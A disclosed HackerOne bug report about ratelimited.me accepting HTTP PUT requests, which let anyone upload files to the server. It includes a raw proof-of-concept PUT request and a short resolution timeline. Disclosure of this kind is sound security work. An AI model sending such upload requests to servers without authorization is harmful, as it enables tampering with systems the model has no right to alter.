---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/improper-access-control-generic
  - env/web
substate: "resolved"
weakness: "Improper Access Control - Generic"
enriched: true
body: true
date: 2018-12-11
submitted: 2018-06-21T15:57:50.449Z
bounty_usd: null
votes: 44
cve: []
program: "[[programs/ratelimited|RATELIMITED]]"
reporter: "emitrani"
source: "https://hackerone.com/reports/369581"
title: "HTTP PUT method enabled"
---
# HTTP PUT method enabled

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 44 | **Program:** RATELIMITED | **Disclosed:** 2018-12-11

- Report: [https://hackerone.com/reports/369581](https://hackerone.com/reports/369581)
- CWE: Improper Access Control - Generic
- Submitted: 2018-06-21T15:57:50.449Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

Hi security team,

**Summary:** It is possible to upload files to the server using the PUT method

## Steps To Reproduce:

1. I used the following request:

```
PUT /emitrani.txt HTTP/1.1
Host: ratelimited.me
Content-Length: 10
Connection: close

emitrani POC
```
Now a file exists at https://ratelimited.me/emitrani.txt
with contents of the put request.

## Impact

Anyone can upload files to the server.

Regards,
Eray

## Timeline

- **Report Filed**
- **Report Needs More Info**
- **Report Triaged**
- **2018-06-21** @emitrani: Hi George,

I just went out, I can check in an hour. Apologies for the delay.

Regards,
Eray
- **2018-06-21** @emitrani: Hi @gtsatsis 

It's  fixed.
{F311210}
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
